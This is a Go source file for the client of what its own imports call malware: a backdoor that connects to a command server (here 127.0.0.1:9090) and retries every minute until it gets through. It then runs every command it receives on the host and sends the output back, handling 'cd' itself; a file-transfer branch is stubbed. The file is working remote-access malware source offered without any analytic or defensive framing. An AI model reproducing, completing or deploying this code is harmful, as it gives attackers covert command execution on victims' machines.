package main

//Client

import (
	"bufio"
	"fmt"
	network "malware/core/Network"
	platforms "malware/core/Platforms"
	utils "malware/core/Utils"
	"net"
	"os"
	"strings"
	"time"
)

func main() {

	var conn net.Conn

	IP := "127.0.0.1"
	Port := "9090"
begin:
	conn, err := network.ConnectionWithServer(IP, Port)
	if err != nil {
		time.Sleep(time.Minute * 1)
		goto begin
	}

	defer conn.Close()

	var userInput string
	resCmd := platforms.Run("pwd")
	utils.Encode(conn, resCmd)
	for {
		reader := bufio.NewReader(conn)
		userInput, err = reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}
		strCommand := strings.TrimSuffix(userInput, "\n")
		userCommand := strings.Split(strCommand, " ")

		if userCommand[0] == "file" {
			if len(userCommand) < 3 {
				continue
			}
			switch userCommand[1] {
			case "download":
				fmt.Println("file should be uploaded")
				//core.UploadFile(conn, userCommand[2])
				continue
			case "upload":
				continue
			}
		}

		if userCommand[0] == "cd" {
			if userCommand[1] == "" {
				userCommand[1] = "/"
			}
			os.Chdir(userCommand[1])
			userCommand[0] = "pwd"
		}

		resCmd := platforms.Run(userCommand[0], userCommand[1:]...)

		utils.Encode(conn, resCmd)
	}
}
